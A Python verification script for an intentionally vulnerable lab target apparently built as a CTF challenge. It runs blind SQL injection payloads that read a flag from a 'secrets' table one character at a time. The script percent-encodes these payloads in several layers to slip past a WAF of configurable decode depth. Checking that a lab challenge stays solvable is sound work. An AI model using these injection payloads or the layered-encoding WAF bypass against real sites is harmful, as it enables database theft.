"""Self-check for the polymorphic Citadel: for each WAF decode depth d in {0,1,2}, prove
  * a payload encoded d+1 times evades the WAF AND the blind oracle answers truthfully,
  * the SAME payload encoded only d times is caught by the WAF (403),
  * the injectable parameter name is honored (test a non-`q` instance).
In-process (Flask test client) — no docker, no network. Run: ./.venv/bin/python targets/verify_citadel_poly.py
"""
import citadel_poly_app as mod
from citadel_app import FLAG


def _enc1(s: str) -> str:                       # percent-encode EVERY char, one layer
    return "".join("%%%02x" % ord(c) for c in s)


def _encn(s: str, n: int) -> str:
    for _ in range(n):
        s = _enc1(s)
    return s


def _get(client, param: str, value_layers: str):
    return client.get(f"/api/search?{param}=" + value_layers)


def _present(resp) -> bool:
    return bool(resp.get_json().get("products"))


def check(depth: int, param: str = "q"):
    mod.WAF_DEPTH, mod.PARAM = depth, param
    mod.RATE_MAX, mod.JITTER_MS = 10_000, 0     # disable throttle/jitter for a deterministic check
    c = mod.app.test_client()
    true_p = f"0||ascii(substr((select flag from secrets),1,1))>{ord(FLAG[0]) - 1}"   # char1 > (c-1) => true
    false_p = f"0||ascii(substr((select flag from secrets),1,1))>{ord(FLAG[0]) + 50}"  # > c+50 => false

    # encoded d+1 times: evades WAF, oracle evaluates correctly (true stays true, false stays false)
    r_true = _get(c, param, _encn(true_p, depth + 1))
    r_false = _get(c, param, _encn(false_p, depth + 1))
    assert r_true.status_code == 200 and _present(r_true), f"d={depth}: true-cond should pass+match"
    assert r_false.status_code == 200 and not _present(r_false), f"d={depth}: false-cond should be empty"

    # encoded only d times: the WAF still sees the literal keyword -> blocked
    r_shallow = _get(c, param, _encn(true_p, depth))
    assert r_shallow.status_code == 403, f"d={depth}: depth-{depth} encode should be WAF-blocked"


if __name__ == "__main__":
    for d in (0, 1, 2):
        check(d, "q")
        print(f"  ok  WAF depth {d}: depth-{d+1} encode solves, depth-{d} blocked")
    check(1, "item")                            # a non-default parameter name is honored
    print("  ok  non-default parameter name honored (item=)")
    print("\ncitadel_poly verified: polymorphic across WAF depth {0,1,2} and param name, still solvable")
